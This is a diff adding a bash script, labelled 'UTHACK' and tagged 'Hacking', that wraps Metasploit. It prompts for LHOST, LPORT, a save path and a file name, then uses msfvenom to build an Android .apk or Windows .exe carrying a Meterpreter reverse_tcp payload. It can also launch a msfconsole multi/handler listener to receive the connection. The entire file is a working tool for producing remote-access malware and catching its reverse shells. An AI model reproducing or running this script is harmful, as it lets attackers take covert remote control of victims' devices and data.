@@ -1,0 +1,91 @@
+#!/bin/bash
+# Coded by Muhxz
+# CAT: Utilitarios/Hacking
+
+   # Global Variables #
+
+error="\033[01;31m" #Red color to error message
+red="\033[31m" #Red color default
+green="\033[32m" #Green color default
+yellow="\033[33m" #Yellow color default
+blue="\033[34m" #Blue color default
+pink="\033[35m" #Pink color default
+cyan="\033[36m" #Cyan color default
+white="\033[37m" #White color default
+green2="\033[01;32m" #Green Low
+
+
+###############################
+#         ## Body ##          #
+###############################
+
+clear
+
+echo ""
+echo -e "$green2"
+echo -e "        ░      ░   ░░░░░░░░  ░░░░ ░░░   ░░░░   ░░░    ░░░░░░░░░  ░░░░░░░     "
+echo -e "       ▓██    ██▒▒█▒▒▒░▒██▒░██▒▒▒██▒▒█▓ █▓▒▓█░██▒▒█▓ █▓▒▒▒▒▓█▓▒░█▒▒▒▓█▒▒▓█░  "
+echo -e "       ▓██▒  ▒██▒█▓     ██  █░   █▒   █░█   ███░  ░█░█      █  ▓█   ░█   ██  "
+echo -e "       ▓█ █  █ █▒▓█▒▒   ██  █▓▒▒ █▒░▓▓▒ █▒▒▓▓ █▒░▓▓▒ █▒▒▒   █  ▓█▒▒ ░█ ▒▓█   "
+echo -e "       ▓█ ▓██▒ █▒▓▓     ██  █    █▒░█▒  █     █▒░█▒  █      █  ▓█   ░█ ▓█    "
+echo -e "       ▒▓  ██  █░ █▓▓▓  ▓▓  ▒█▓▒░█░  █▒ █     █░  █▒ ▓▓▓▓▒  █   █▓▓▒▒█  ▒█ Only Kali 2.0   "
+echo -e "                                                   "
+echo -e "$error                                             UTHACK by Muhxz    "
+echo ""
+echo -e "$white"
+echo "             Meterpreter for     1) Android     2) Windows "
+echo ""
+
+
+
+read -p "    		   [/?: " option
+
+echo ""
+echo "				   Options"
+echo ""
+
+read -p "			    LHOST: " Lhost
+read -p "			    LPORT: " Lport
+read -p "			    Save file in: " Save
+read -p "			    Name: " Name
+
+if [ "$option" = "1" ]; then
+	echo ""
+	msfvenom --payload android/meterpreter/reverse_tcp LHOST=$Lhost LPORT=$Lport R > $Save$Name.apk
+	echo -e "				Activate listening mode now? s/n"
+	read -p "                  [/?: " listmode1
+
+	case $listmode1 in
+	"s" | "S")
+	msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $Lhost; set LPORT $Lport; run"
+	;;
+	
+	"n" | "N")
+	echo "Payload created. [ saved in: $Save ] "
+	;;
+
+	esac
+elif [ "$option" = "2" ]; then
+	echo ""
+        msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$Lhost LPORT=$Lport X > $Save$Name.exe
+        echo -e "                               Activate listening mode now? s/n"
+        read -p "                  [/?: " listmode2
+        case $listmode2 in
+        "s" | "S")
+        msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $Lhost; set LPORT $Lport; run"
+	;;
+
+        "n" | "N")
+        echo "Payload created. [ saved in: $Save ] "
+	;;
+
+	esac
+
+else
+	echo ""
+	echo -e "$error 				ERROR! $error"
+	echo -e "$error			   [Invalid Option] $error"
+	echo ""
+	exit;
+
+fi
